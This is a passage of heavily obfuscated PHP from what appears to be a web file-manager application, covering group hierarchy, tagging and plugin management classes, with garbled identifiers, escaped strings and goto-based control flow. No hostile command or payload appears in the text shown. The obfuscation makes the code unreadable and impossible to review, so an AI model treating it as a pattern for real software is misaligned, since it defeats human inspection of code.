$Å—’Õ°«[$ô–¦Ëş¨[526]] = str_replace($ô–¦Ëş¨[529], $ô–¦Ëş¨[8], $¨¥¿ÊÑ); } unset($Å—’Õ°«); } private function _listAppendSourceRoot(&$·«ªıÌ€, $—µ¤ó¶İ) { $óÓˆÎ¤ö =& $_SERVER[ùÆÎÔ“Ñ]; $›¯¶¡Ò = Model($óÓˆÎ¤ö[826])->listSourceRoot(SourceModel::TYPE_GROUP, $—µ¤ó¶İ); $›¯¶¡Ò = array_to_keyvalue($›¯¶¡Ò, $óÓˆÎ¤ö[505]); $›¯¶¡Ò = array_remove_key($›¯¶¡Ò, $óÓˆÎ¤ö[505]); foreach ($·«ªıÌ€ as &$«Ú¶¢®) { $«Ú¶¢®[$óÓˆÎ¤ö[86]] = $›¯¶¡Ò[$«Ú¶¢®[$óÓˆÎ¤ö[1857]]] ? $›¯¶¡Ò[$«Ú¶¢®[$óÓˆÎ¤ö[1857]]] : array(); } unset($«Ú¶¢®); } protected function groupMerge($ü²úè‘) { $ü²úè‘ = array_values(array_unique($ü²úè‘)); $‹ÚéĞ’û = array(); for ($ˆ„ãë¹Ú = 0; $ˆ„ãë¹Ú < count($ü²úè‘); $ˆ„ãë¹Ú++) { $íøİÏ‹ = !1; for ($÷ğŞ¾¦À = 0; $÷ğŞ¾¦À < count($ü²úè‘); $÷ğŞ¾¦À++) { if ($ˆ„ãë¹Ú == $÷ğŞ¾¦À) { continue; } if ($this->isParentOf($ü²úè‘[$÷ğŞ¾¦À], $ü²úè‘[$ˆ„ãë¹Ú])) { $íøİÏ‹ = !0; break; } } if (!$íøİÏ‹) { $‹ÚéĞ’û[] = $ü²úè‘[$ˆ„ãë¹Ú]; } } return $‹ÚéĞ’û; } protected function isParentOf($ºÕõç×ë, $ºªÉ‡ƒÊ) { $¡“¿ıı„ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$ºÕõç×ë || !$ºªÉ‡ƒÊ || $ºÕõç×ë == $ºªÉ‡ƒÊ) { return !1; } $ÔÏâÖ¾ = $this->getInfoSimple($ºÕõç×ë); $ü”Ì”øß = $this->getInfoSimple($ºªÉ‡ƒÊ); $Ö½…ûÊû = $ÔÏâÖ¾[$¡“¿ıı„[521]] . $ºÕõç×ë . $¡“¿ıı„[50]; if (substr($ü”Ì”øß[$¡“¿ıı„[521]], 0, strlen($Ö½…ûÊû)) == $Ö½…ûÊû) { return !0; } return !1; } public function groupShowRoot($¾ü´¶–¸, $—õí£ñÓ = false) { $è‹˜ÉÖ• =& $_SERVER[ùÆÎÔ“Ñ]; $íİ¶¸µ = $this->getInfo($¾ü´¶–¸); if (!$íİ¶¸µ) { return array(); } $Æ·¶¸µ• = $this->parentLevelArray($íİ¶¸µ[$è‹˜ÉÖ•[521]]); $¹ÂËş©• = array($¾ü´¶–¸); if (count($Æ·¶¸µ•) == 0) { return $¹ÂËş©•; } if ($—õí£ñÓ && count($Æ·¶¸µ•) == 1) { return $¹ÂËş©•; } if (!$íİ¶¸µ[$è‹˜ÉÖ•[466]] || !isset($íİ¶¸µ[$è‹˜ÉÖ•[466]][$è‹˜ÉÖ•[1943]]) || $íİ¶¸µ[$è‹˜ÉÖ•[466]][$è‹˜ÉÖ•[1943]] == $è‹˜ÉÖ•[1912]) { return $this->groupShowRoot($Æ·¶¸µ•[count($Æ·¶¸µ•) - 1], $—õí£ñÓ); } if ($íİ¶¸µ[$è‹˜ÉÖ•[466]][$è‹˜ÉÖ•[1943]] == $è‹˜ÉÖ•[357]) { $ÉÕç±ïÉ = explode($è‹˜ÉÖ•[50], $íİ¶¸µ[$è‹˜ÉÖ•[466]][$è‹˜ÉÖ•[1944]]); if ($ÉÕç±ïÉ) { $¹ÂËş©• = array_merge($¹ÂËş©•, $ÉÕç±ïÉ); } } return $¹ÂËş©•; } protected function resetParentLevel() { $õÚƒ¸™˜ =& $_SERVER[ùÆÎÔ“Ñ]; $´Àæ§Ø = $õÚƒ¸™˜[1857]; $¤ÊºÁ® = $this->select(); $¤ÊºÁ® = array_to_keyvalue($¤ÊºÁ®, $´Àæ§Ø); foreach ($¤ÊºÁ® as $» ØÒ ) { $²ü§ïëí = $» ØÒ ; $İÜÑ¾—È = array(); while ($²ü§ïëí[$õÚƒ¸™˜[432]] != 0) { $İÜÑ¾—È[] = $²ü§ïëí[$õÚƒ¸™˜[432]]; $²ü§ïëí = $¤ÊºÁ®[$²ü§ïëí[$õÚƒ¸™˜[432]]]; } $İÜÑ¾—È[] = 0; $İÜÑ¾—È = $õÚƒ¸™˜[50] . implode($õÚƒ¸™˜[50], array_reverse($İÜÑ¾—È)) . $õÚƒ¸™˜[50]; $this->setNamePinyin($» ØÒ [$´Àæ§Ø], $» ØÒ [$õÚƒ¸™˜[32]]); $this->where(array($´Àæ§Ø => $» ØÒ [$´Àæ§Ø]))->save(array($õÚƒ¸™˜[590] => $İÜÑ¾—È)); } return $¤ÊºÁ®; } public function groupNameAuto($ğœ–ÆÑÍ, $œßŒ«¯î) { $ü°¯øÕã =& $_SERVER[ùÆÎÔ“Ñ]; $ç©³Œíğ = $this->where(array($ü°¯øÕã[401] => $ğœ–ÆÑÍ))->getField($ü°¯øÕã[32], !0); if (!$ç©³Œíğ || !in_array($œßŒ«¯î, $ç©³Œíğ)) { return $œßŒ«¯î; } for ($¾Çè¶Ù€ = 1; $¾Çè¶Ù€ <= count($ç©³Œíğ) + 1; $¾Çè¶Ù€++) { $Äã•½Ÿå = $œßŒ«¯î . "\x28{$¾Çè¶Ù€}\x29"; if (!in_array($Äã•½Ÿå, $ç©³Œíğ)) { return $Äã•½Ÿå; } } } public function groupSwitch($ƒí¬øÚ², $è¯¡îÑ) { $ÑöÅ•Àü =& $_SERVER[ùÆÎÔ“Ñ]; $Ÿô›³ù² = array($ÑöÅ•Àü[1857] => array($ÑöÅ•Àü[7], array($ƒí¬øÚ², $è¯¡îÑ))); $¦òà¹îü = $this->where($Ÿô›³ù²)->select(); $¦òà¹îü = array_to_keyvalue($¦òà¹îü, $ÑöÅ•Àü[1857]); if (!isset($¦òà¹îü[$ƒí¬øÚ²]) || !isset($¦òà¹îü[$è¯¡îÑ]) || $¦òà¹îü[$ƒí¬øÚ²][$ÑöÅ•Àü[432]] == 0) { return !1; } $Ÿô›³ù² = array($ÑöÅ•Àü[1857] => $ƒí¬øÚ²); $‡èĞëå  = Model($ÑöÅ•Àü[1947])->where($Ÿô›³ù²)->select(); if (!$‡èĞëå ) { $‡èĞëå  = array(); } foreach ($‡èĞëå  as $ÎÂ¯äşÂ) { $óò¾¯ıç = $ÎÂ¯äşÂ[$ÑöÅ•Àü[1667]]; $Ÿô›³ù² = array($ÑöÅ•Àü[1667] => $óò¾¯ıç, $ÑöÅ•Àü[1857] => $è¯¡îÑ); $ô¡‚¢¹¾ = Model($ÑöÅ•Àü[1947])->where($Ÿô›³ù²)->find(); if (!$ô¡‚¢¹¾) { $Œ½Ç³¬ = array($è¯¡îÑ => $ÎÂ¯äşÂ[$ÑöÅ•Àü[1961]]); Model($ÑöÅ•Àü[535])->userGroupAdd($óò¾¯ıç, $Œ½Ç³¬); } Model($ÑöÅ•Àü[535])->userGroupRemove($óò¾¯ıç, $ƒí¬øÚ²); } $Ÿô›³ù² = array($ÑöÅ•Àü[411] => 2, $ÑöÅ•Àü[432] => 0, $ÑöÅ•Àü[410] => 1, $ÑöÅ•Àü[505] => array($ÑöÅ•Àü[7], array($ƒí¬øÚ², $è¯¡îÑ))); $§Ñ”½ÍÈ = Model($ÑöÅ•Àü[826])->where($Ÿô›³ù²)->field($ÑöÅ•Àü[1962])->select(); $§Ñ”½ÍÈ = array_to_keyvalue($§Ñ”½ÍÈ, $ÑöÅ•Àü[505], $ÑöÅ•Àü[402]); $—Úâ¸ú¾ = !empty($§Ñ”½ÍÈ[$ƒí¬øÚ²]) ? $§Ñ”½ÍÈ[$ƒí¬øÚ²] : !1; if ($—Úâ¸ú¾) { if (!$§Ñ”½ÍÈ[$è¯¡îÑ]) { $§Ñ”½ÍÈ[$è¯¡îÑ] = Model($ÑöÅ•Àü[826])->groupRootAdd($è¯¡îÑ); } $˜ÄÎÃÜ = $§Ñ”½ÍÈ[$è¯¡îÑ]; $Ÿô›³ù² = array($ÑöÅ•Àü[432] => $—Úâ¸ú¾); $§Ñ”½ÍÈ = Model($ÑöÅ•Àü[826])->where($Ÿô›³ù²)->field($ÑöÅ•Àü[1963])->select(); if (!$§Ñ”½ÍÈ) { $§Ñ”½ÍÈ = array(); } Model($ÑöÅ•Àü[826])->moveClearAuth = !1; foreach ($§Ñ”½ÍÈ as $¨ÔÔ«†‡) { $Ç¼ìƒö = $¨ÔÔ«†‡[$ÑöÅ•Àü[410]] == $ÑöÅ•Àü[88] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($ÑöÅ•Àü[826])->move($¨ÔÔ«†‡[$ÑöÅ•Àü[402]], $˜ÄÎÃÜ, $Ç¼ìƒö); } Model($ÑöÅ•Àü[826])->moveClearAuth = !0; $Ÿô›³ù² = array($ÑöÅ•Àü[411] => 2, $ÑöÅ•Àü[505] => $ƒí¬øÚ²); $Ôæ†˜áà = array($ÑöÅ•Àü[505] => $è¯¡îÑ); Model($ÑöÅ•Àü[1964])->where($Ÿô›³ù²)->save($Ôæ†˜áà); Model($ÑöÅ•Àü[1965])->where($Ÿô›³ù²)->save($Ôæ†˜áà); } $this->_changeChildLevel($¦òà¹îü[$ƒí¬øÚ²], $¦òà¹îü[$è¯¡îÑ], !0); $this->where(array($ÑöÅ•Àü[432] => $ƒí¬øÚ²))->save(array($ÑöÅ•Àü[432] => $è¯¡îÑ)); $this->_clearChildrenCache($¦òà¹îü[$è¯¡îÑ]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\163\x65\x72\x5f\146\141\x76"; protected function cacheFunctionAlias($è‚¹ßãğ) { $‰ê’Ÿ±ú =& $_SERVER[ùÆÎÔ“Ñ]; return array($‰ê’Ÿ±ú[1966] => array($è‚¹ßãğ[0], $‰ê’Ÿ±ú[1967]), $‰ê’Ÿ±ú[1968] => array($è‚¹ßãğ[0], $‰ê’Ÿ±ú[1969])); } protected function get($á¿´èñ¶) { $¢ò•×é =& $_SERVER[ùÆÎÔ“Ñ]; $±óÈ½è = Model($¢ò•×é[522])->metaGet($á¿´èñ¶, $¢ò•×é[1970]); $ŠÁÆÒÎ¥ = json_decode($±óÈ½è, !0); return $ŠÁÆÒÎ¥ ? $ŠÁÆÒÎ¥ : array($¢ò•×é[1971] => $¢ò•×é[88], $¢ò•×é[369] => array()); } protected function set($Ğ¹„ÜÇó, $åÜËõù) { $µé­éËŒ =& $_SERVER[ùÆÎÔ“Ñ]; $åÜËõù = $åÜËõù ? $åÜËõù : array($µé­éËŒ[1971] => $µé­éËŒ[88], $µé­éËŒ[369] => array()); return Model($µé­éËŒ[522])->metaSet($Ğ¹„ÜÇó, $µé­éËŒ[1970], json_encode($åÜËõù)); } protected function getByTagID($›ïêÚó, $Û¸ŒŠ¦Ì) { $…û¿˜ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$›ïêÚó || !$Û¸ŒŠ¦Ì) { return !1; } if (!Model($…û¿˜[522])->getInfoSimple($›ïêÚó)) { return !1; } $Ëš äÔ„ = $this->get($›ïêÚó); if (!$Ëš äÔ„ || !isset($Ëš äÔ„[$…û¿˜[369]])) { return !1; } $œ¾Ò—æ˜ = array_find_by_field($Ëš äÔ„[$…û¿˜[369]], $…û¿˜[399], $Û¸ŒŠ¦Ì); return is_array($œ¾Ò—æ˜) ? $œ¾Ò—æ˜ : !1; } public function listSource($Çô¹ê÷­, $÷ÎÀ®³Ÿ) { $ïüÛªŒŞ =& $_SERVER[ùÆÎÔ“Ñ]; if ($÷ÎÀ®³Ÿ && !is_array($÷ÎÀ®³Ÿ)) { $÷ÎÀ®³Ÿ = array($÷ÎÀ®³Ÿ); } $€³Ä›Û´ = $this->listData($Çô¹ê÷­); $°ƒ‡ŸÇ¹ = array(); foreach ($€³Ä›Û´ as $¸”ÎüÕ) { $ÒÉñ = $¸”ÎüÕ[$ïüÛªŒŞ[84]]; if (!$ÒÉñ) { continue; } if (!isset($°ƒ‡ŸÇ¹[$ÒÉñ])) { $°ƒ‡ŸÇ¹[$ÒÉñ] = array(); } $°ƒ‡ŸÇ¹[$ÒÉñ][] = $¸”ÎüÕ[$ïüÛªŒŞ[426]]; } $°›õ·‡’ = array(); foreach ($°ƒ‡ŸÇ¹ as $±õ‘Ğ€Â => $İÂø’¤®) { $¢¿ù¼°Ê = !0; if (!$÷ÎÀ®³Ÿ) { $°›õ·‡’[] = $±õ‘Ğ€Â; continue; } foreach ($÷ÎÀ®³Ÿ as $¡ÌüŸ’ë) { if (!in_array($¡ÌüŸ’ë, $İÂø’¤®)) { $¢¿ù¼°Ê = !1; break; } } if ($¢¿ù¼°Ê) { $°›õ·‡’[] = $±õ‘Ğ€Â; } } if (!$°›õ·‡’) { return array(); } $ëÑ„Ï¢ë = array($ïüÛªŒŞ[417] => array($ïüÛªŒŞ[418], $°›õ·‡’), $ïüÛªŒŞ[505] => $Çô¹ê÷­, $ïüÛªŒŞ[411] => SourceModel::TYPE_GROUP); $‘¥Éõõ = Model($ïüÛªŒŞ[1341])->listSource($ëÑ„Ï¢ë); if (!$‘¥Éõõ || count($°›õ·‡’) == $‘¥Éõõ[$ïüÛªŒŞ[366]][$ïüÛªŒŞ[367]]) { return $‘¥Éõõ; } $Ü„¨¸¤¿ = array(); $‡á½èïã = array_to_keyvalue($‘¥Éõõ[$ïüÛªŒŞ[82]], $ïüÛªŒŞ[12], $ïüÛªŒŞ[402]); $êœº„Ñ = array_to_keyvalue($‘¥Éõõ[$ïüÛªŒŞ[83]], $ïüÛªŒŞ[12], $ïüÛªŒŞ[402]); $ö”ğá… = array_merge($êœº„Ñ, $‡á½èïã); foreach ($°›õ·‡’ as $ÒÉñ) { if (!in_array($ÒÉñ, $ö”ğá…)) { $Ü„¨¸¤¿[] = $ÒÉñ; } } if ($Ü„¨¸¤¿) { $this->removeBySource($Çô¹ê÷­, $Ü„¨¸¤¿); } return $‘¥Éõõ; } protected function listData($ˆº¬ƒ“Õ) { $‡¸”Óî¥ =& $_SERVER[ùÆÎÔ“Ñ]; $à¦ïŸ  = array($‡¸”Óî¥[1658] => 0, $‡¸”Óî¥[484] => array($‡¸”Óî¥[1972], 0), $‡¸”Óî¥[422] => $‡¸”Óî¥[1973] . $ˆº¬ƒ“Õ); $ùÀ‘™¹¶ = $‡¸”Óî¥[1974]; $Ëà¥§± = $this->field($ùÀ‘™¹¶)->where($à¦ïŸ )->order($‡¸”Óî¥[1975])->select(); return $Ëà¥§± ? $Ëà¥§± : array(); } protected function addToTag($¯Ñ‘ÚüÅ, $úÖ™Şí, $‰¬ÅÕ¼§) { $ÁÅş„© =& $_SERVER[ùÆÎÔ“Ñ]; if (!$this->getByTagID($¯Ñ‘ÚüÅ, $‰¬ÅÕ¼§) || !$úÖ™Şí) { return !1; } if (!Model($ÁÅş„©[826])->pathInfo($úÖ™Şí)) { return !1; } $°¿«º = array($ÁÅş„©[1658] => 0, $ÁÅş„©[484] => $‰¬ÅÕ¼§, $ÁÅş„©[421] => $úÖ™Şí, $ÁÅş„©[422] => $ÁÅş„©[1976] . $¯Ñ‘ÚüÅ, $ÁÅş„©[420] => $ÁÅş„©[12], $ÁÅş„©[1861] => 0); if ($this->where($°¿«º)->find()) { return !1; } return $this->add($°¿«º); } protected function removeFromTag($‡¿İÑîÆ, $×ü ØŸ¡, $¦ìö¤‘Ş) { $±íî£ñÆ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$this->getByTagID($‡¿İÑîÆ, $¦ìö¤‘Ş) || !$×ü ØŸ¡) { return !1; } if (is_array($×ü ØŸ¡)) { $×ü ØŸ¡ = array($±íî£ñÆ[7], $×ü ØŸ¡); } $‡Ô™û¸ = array($±íî£ñÆ[1658] => 0, $±íî£ñÆ[484] => $¦ìö¤‘Ş, $±íî£ñÆ[422] => $±íî£ñÆ[1976] . $‡¿İÑîÆ, $±íî£ñÆ[421] => $×ü ØŸ¡); return $this->where($‡Ô™û¸)->delete(); } protected function removeByTag($üÃ½ü÷î, $ÁÎ¥ìÃÇ) { $üÜİÁñ =& $_SERVER[ùÆÎÔ“Ñ]; if (!$this->getByTagID($üÃ½ü÷î, $ÁÎ¥ìÃÇ)) { return !1; } $éê•’¦ğ = array($üÜİÁñ[1658] => 0, $üÜİÁñ[484] => $ÁÎ¥ìÃÇ, $üÜİÁñ[422] => $üÜİÁñ[1976] . $üÃ½ü÷î); return $this->where($éê•’¦ğ)->delete(); } protected function removeBySource($®òÏê, $¿‡Ô“ÆŞ) { $øÆ‡ºüù =& $_SERVER[ùÆÎÔ“Ñ]; if (!$®òÏê || !$¿‡Ô“ÆŞ) { return !1; } if (is_array($¿‡Ô“ÆŞ)) { $¿‡Ô“ÆŞ = array($øÆ‡ºüù[7], $¿‡Ô“ÆŞ); } $êè¸İÎş = array($øÆ‡ºüù[1658] => 0, $øÆ‡ºüù[421] => $¿‡Ô“ÆŞ, $øÆ‡ºüù[484] => array($øÆ‡ºüù[1019], 0), $øÆ‡ºüù[422] => $øÆ‡ºüù[1976] . $®òÏê); return $this->where($êè¸İÎş)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\x6d\56\160\x6c\x75\147\x69\156\114\151\x73\164"; public $field = array("\x6e\x61\x6d\x65", "\163\164\x61\x74\165\163", "\162\145\x67\151\x65\x73\x74", "\x63\x6f\156\146\151\x67"); public function loadList($½í³—Ã = false) { $ùŞä¢ŒÌ = array_to_keyvalue($this->listData(), $_SERVER[ùÆÎÔ“Ñ][32]); if ($½í³—Ã) { return $ùŞä¢ŒÌ[$½í³—Ã]; } return $ùŞä¢ŒÌ; } public function init() { $øÎ•’º¬ =& $_SERVER[ùÆÎÔ“Ñ]; Hook::trigger($øÎ•’º¬[1977]); $ƒ—ÔÏ„œ = $this->loadPluginList(); foreach ($ƒ—ÔÏ„œ as $ô†šÍ Ò => $›‚şŒ·Î) { $ØÀ¦¦¶ = $this->appAllow($ô†šÍ Ò, $›‚şŒ·Î); if (!$ØÀ¦¦¶) { continue; } foreach ($›‚şŒ·Î[$øÎ•’º¬[1978]] as $Ñ‹ÜÂè¦ => $âèÖ¤±¡) { Hook::bind($Ñ‹ÜÂè¦, $âèÖ¤±¡); } } Hook::trigger($øÎ•’º¬[1979]); Hook::trigger(ACTION); } public function appAllow($â´ÒÃ‡¥, $ôÙğ–‰Ë, $œñŒ²ã° = true) { $Èèæà¾Ü =& $_SERVER[ùÆÎÔ“Ñ]; $Š´é = PLUGIN_DIR . $â´ÒÃ‡¥ . $Èèæà¾Ü[1980]; if (!is_array($ôÙğ–‰Ë) || !is_array($ôÙğ–‰Ë[$Èèæà¾Ü[1978]]) || $ôÙğ–‰Ë[$Èèæà¾Ü[751]] != 1 || !is_file($Š´é)) { return !1; } if ($GLOBALS[$Èèæà¾Ü[503]] == 1) { if ($GLOBALS[$Èèæà¾Ü[6]][$Èèæà¾Ü[1981]] || !$GLOBALS[$Èèæà¾Ü[6]][$Èèæà¾Ü[1982]]) { return !0; } $æ§„¡÷ = explode($Èèæà¾Ü[50], strtolower($GLOBALS[$Èèæà¾Ü[6]][$Èèæà¾Ü[1982]])); return in_array(strtolower($â´ÒÃ‡¥), $æ§„¡÷) ? !1 : !0; } if ($œñŒ²ã° && !Action($Èèæà¾Ü[1983])->checkAuth($â´ÒÃ‡¥)) { return !1; } return !0; } public function unInstall($Õ”û×ü¬) { $¼Æáü‚ˆ =& $_SERVER[ùÆÎÔ“Ñ]; $›‹µê»‰ = $this->loadList($Õ”û×ü¬); if (file_exists(PLUGIN_DIR . $Õ”û×ü¬)) { Hook::apply($Õ”û×ü¬ . $¼Æáü‚ˆ[1984]); } $this->remove($›‹µê»‰[$¼Æáü‚ˆ[399]]); } public function changeStatus($‚ œš›ş, $É¹‘Ùƒ) { $úÃ¤½µ =& $_SERVER[ùÆÎÔ“Ñ]; $ß¦û©ŸÎ = $this->loadList($‚ œš›ş); if ($É¹‘Ùƒ) { Hook::apply($‚ œš›ş . $úÃ¤½µ[1985]); } $this->update($ß¦û©ŸÎ[$úÃ¤½µ[399]], array($úÃ¤½µ[1986] => $É¹‘Ùƒ)); } public function appRegist($ÎİÔ™, $‰«Øë) { $íß£˜Ñ‡ =& $_SERVER[ùÆÎÔ“Ñ]; $Î›­¤æÒ = $this->loadList($ÎİÔ™); if ($Î›­¤æÒ) { $this->update($Î›­¤æÒ[$íß£˜Ñ‡[399]], array($íß£˜Ñ‡[1978] => $‰«Øë)); } else { $Ç”äæè = array($íß£˜Ñ‡[32] => $ÎİÔ™, $íß£˜Ñ‡[1978] => $‰«Øë, $íß£˜Ñ‡[751] => 0, $íß£˜Ñ‡[6] => $this->getConfigDefault($ÎİÔ™)); $this->insert($Ç”äæè); } } public function getConfigDefault($Ç½Õó¹Ó) { $ÛÌ°®…ô =& $_SERVER[ùÆÎÔ“Ñ]; $˜†„¡¶œ = array(); $èÀ©ß®ë = $this->getPackageJson($Ç½Õó¹Ó); if (!$èÀ©ß®ë && is_array($èÀ©ß®ë[$ÛÌ°®…ô[1987]])) { return $˜†„¡¶œ; } foreach ($èÀ©ß®ë[$ÛÌ°®…ô[1987]] as $şèæÃÄ° => $ì½·«Ì·) { if (!isset($ì½·«Ì·[$ÛÌ°®…ô[374]]) || isset($˜†„¡¶œ[$şèæÃÄ°])) { continue; } $˜†„¡¶œ[$şèæÃÄ°] = $ì½·«Ì·[$ÛÌ°®…ô[374]]; } return $˜†„¡¶œ; } public function getPackageJson($á«ÃÂ½¤) { return Hook::apply($á«ÃÂ½¤ . $_SERVER[ùÆÎÔ“Ñ][1988]); } public function getConfig($«èÇÖ¤, $“›´‡ = false) { $ã†“Û¿½ =& $_SERVER[ùÆÎÔ“Ñ]; $ş¦£Ê¹ƒ = array(); $õ€í—İ = $this->loadList($«èÇÖ¤); if ($õ€í—İ && is_array($õ€í—İ[$ã†“Û¿½[6]])) { $ş¦£Ê¹ƒ = $õ€í—İ[$ã†“Û¿½[6]]; } if (!$ş¦£Ê¹ƒ || $“›´‡) { $ş¦£Ê¹ƒ = $this->getConfigDefault($«èÇÖ¤); } return $ş¦£Ê¹ƒ; } public function setConfig($Ğˆ’š’›, $µ§ëä™¹ = false) { $†åÔÏğ =& $_SERVER[ùÆÎÔ“Ñ]; $çª÷Üù› = $this->loadList($Ğˆ’š’›); if (!$çª÷Üù›) { return !1; } $ÚÓï§É = $çª÷Üù›[$†åÔÏğ[6]]; if ($µ§ëä™¹ == !1) { $ÚÓï§É = array(); $µ§ëä™¹ = $this->getConfigDefault($Ğˆ’š’›); } foreach ($µ§ëä™¹ as $ËÊÖÅœ => $İù¤‰İ“) { $ÚÓï§É[$ËÊÖÅœ] = is_string($İù¤‰İ“) ? trim($İù¤‰İ“) : $İù¤‰İ“; } $this->update($çª÷Üù›[$†åÔÏğ[399]], array($†åÔÏğ[6] => $ÚÓï§É)); } public function viewList() { $ÇòÓ¶àˆ =& $_SERVER[ùÆÎÔ“Ñ]; $‹íßĞ¥„ = $this->loadList(); $this->pluginScan($‹íßĞ¥„); $‹íßĞ¥„ = $this->loadPluginList(); $—‹ûËè = array(); foreach ($‹íßĞ¥„ as $¿†û¤ùó => $«¡šØ‰†) { unset($«¡šØ‰†[$ÇòÓ¶àˆ[1978]], $«¡šØ‰†[$ÇòÓ¶àˆ[6]]); $–ªèÀş = PLUGIN_DIR . $«¡šØ‰†[$ÇòÓ¶àˆ[32]] . $ÇòÓ¶àˆ[1980]; if (!is_file($–ªèÀş)) { continue; } $Á¿Î¯¢ = Hook::apply($«¡šØ‰†[$ÇòÓ¶àˆ[32]] . $ÇòÓ¶àˆ[1988]); if (is_array($Á¿Î¯¢)) { $—‹ûËè[$¿†û¤ùó] = array_merge($«¡šØ‰†, $Á¿Î¯¢); } } return $—‹ûËè; } private function loadPluginList() { $×¤•«ƒÇ =& $_SERVER[ùÆÎÔ“Ñ]; $‘‘ÆÕßâ = $this->loadList(); if (strtolower(MOD) == $×¤•«ƒÇ[1989]) { return $‘‘ÆÕßâ; } $›©¿·÷ä = Hook::trigger($×¤•«ƒÇ[1990], $‘‘ÆÕßâ); if ($‘‘ÆÕßâ && !$›©¿·÷ä) { die; } return $›©¿·÷ä ? $›©¿·÷ä : $‘‘ÆÕßâ; } private function pluginScan($ÎóØóÆ‘) { $Åõ«åˆ‹ =& $_SERVER[ùÆÎÔ“Ñ]; recursion_dir(PLUGIN_DIR, $²±…ŒÖ“, $Èí¼ëóğ, 0); foreach ($²±…ŒÖ“ as $²ÍÎ»”Á) { $àá‹…Üµ = get_path_this($²ÍÎ»”Á); if (isset($ÎóØóÆ‘[$àá‹…Üµ]) || !file_exists($²ÍÎ»”Á . $Åõ«åˆ‹[1991]) || !file_exists($²ÍÎ»”Á . $Åõ«åˆ‹[1980])) { continue; } Hook::apply($àá‹…Üµ . $Åõ«åˆ‹[1985]); } } } goto E‹›Ä×äù; a½à”Æ‹¸÷: function binCheckBigger($ü†åÈÊÉ, $©ãëà¼Å) { return $ü†åÈÊÉ > $©ãëà¼Å; } $_SERVER[$_SERVER[„Ú¢¸Ô«][3]] = ("\x38\x31\x39\x33".base64_decode('MDE='))+0;$_r9w4="aficvg014xm3s25lqepuytdowj6798zhbkrnwix5ghzu0mnp4yj1k6vo3rf2bcteq";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($¢È†ù‚, $éêœš) { $¤Æ¤¯êÑ =& $_SERVER[ùÆÎÔ“Ñ]; if (isset(self::$_methodList[$¢È†ù‚])) { return @call_user_func_array(self::$_methodList[$¢È†ù‚], $éêœš); } else { if (method_exists($this, $¢È†ù‚)) { return call_user_func_array(array($this, $¢È†ù‚), $éêœš); } else { think_exception(__CLASS__ . $¤Æ¤¯êÑ[4] . $¢È†ù‚ . $¤Æ¤¯êÑ[5]); } } } public static function __callStatic($Åı¦úÖÑ, $ìĞˆüÃ¨) { if (isset(self::$_methodListStatic[$Åı¦úÖÑ])) { return call_user_func_array(self::$_methodListStatic[$Åı¦úÖÑ], $ìĞˆüÃ¨); } else { if (method_exists(self, $Åı¦úÖÑ)) { return call_user_func_array(array(self, $Åı¦úÖÑ), $ìĞˆüÃ¨); } else { show_json("{$Åı¦úÖÑ}\x28\51\40\156\157\x74\40\145\x78\151\163\x74\x3b", !1); } } } public static function addMethod($·Îï¯Î, $†¹¨ËÜï) { self::$_methodList[$·Îï¯Î] = $†¹¨ËÜï; } public static function addMethodStatic($«ÎŠığ–, $èªÃ‚Ä¿) { self::$_methodListStatic[$«ÎŠığ–] = $èªÃ‚Ä¿; } } goto CÚ™ï‹; Cê¯ŒÛË„Ï: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\145\162\137\x66\x61\166"; protected function cacheFunctionAlias($Áêêæ¤Ä) { $òöÕÉ³Ü =& $_SERVER[ùÆÎÔ“Ñ]; return array($òöÕÉ³Ü[1968] => array($òöÕÉ³Ü[2347] . USER_ID, $òöÕÉ³Ü[1969])); } protected function listData() { $€»Íˆ†ˆ =& $_SERVER[ùÆÎÔ“Ñ]; $Ò¶àË = array($€»Íˆ†ˆ[1658] => USER_ID, $€»Íˆ†ˆ[484] => array($€»Íˆ†ˆ[1972], 0)); $ÇÁÙ”® = $€»Íˆ†ˆ[2348]; $„‹£ÆŒ¸ = $this->field($ÇÁÙ”®)->where($Ò¶àË)->order($€»Íˆ†ˆ[1975])->select(); return $„‹£ÆŒ¸ ? $„‹£ÆŒ¸ : array(); } protected function addToTag($Ì…Ç¤ğ¸, $ÇÒ”…ô—) { $˜õ™ğû =& $_SERVER[ùÆÎÔ“Ñ]; if (!Model($˜õ™ğû[2112])->listData($ÇÒ”…ô—)) { return !1; } if (is_numeric($Ì…Ç¤ğ¸)) { $İá¸ğôƒ = Model($˜õ™ğû[826])->pathInfo($Ì…Ç¤ğ¸); if (!$İá¸ğôƒ) { return !1; } } else { $İá¸ğôƒ = IO::infoSimple($Ì…Ç¤ğ¸); if (!$İá¸ğôƒ) { return !1; } $ÈÄˆÜ÷‰ = $İá¸ğôƒ[$˜õ™ğû[32]]; $¦×¡ˆŸ = $İá¸ğôƒ[$˜õ™ğû[33]]; if (isset($İá¸ğôƒ[$˜õ™ğû[410]])) { $¦×¡ˆŸ = $İá¸ğôƒ[$˜õ™ğû[410]] == $˜õ™ğû[88] ? $˜õ™ğû[75] : $˜õ™ğû[199]; } } $åÅÓ÷îì = array($˜õ™ğû[1658] => USER_ID, $˜õ™ğû[484] => $ÇÒ”…ô—, $˜õ™ğû[421] => $Ì…Ç¤ğ¸, $˜õ™ğû[422] => $¦×¡ˆŸ ? $¦×¡ˆŸ : $˜õ™ğû[416], $˜õ™ğû[420] => $ÈÄˆÜ÷‰ ? $ÈÄˆÜ÷‰ : $˜õ™ğû[12], $˜õ™ğû[1861] => 0); if ($this->where($åÅÓ÷îì)->find()) { return !1; } return $this->add($åÅÓ÷îì); } protected function removeFromTag($šªƒš×, $öÓàÅ‚Ÿ) { $¼âé¡ =& $_SERVER[ùÆÎÔ“Ñ]; if (!Model($¼âé¡[2112])->listData($öÓàÅ‚Ÿ)) { return !1; } if (is_array($šªƒš×)) { $šªƒš× = array($¼âé¡[7], $šªƒš×); } $å°Ñšœ = array($¼âé¡[1658] => USER_ID, $¼âé¡[484] => $öÓàÅ‚Ÿ, $¼âé¡[421] => $šªƒš×); return $this->where($å°Ñšœ)->delete(); } protected function removeByTag($ôÒŒÆŞ–) { $ª¾˜–Ë¾ =& $_SERVER[ùÆÎÔ“Ñ]; if 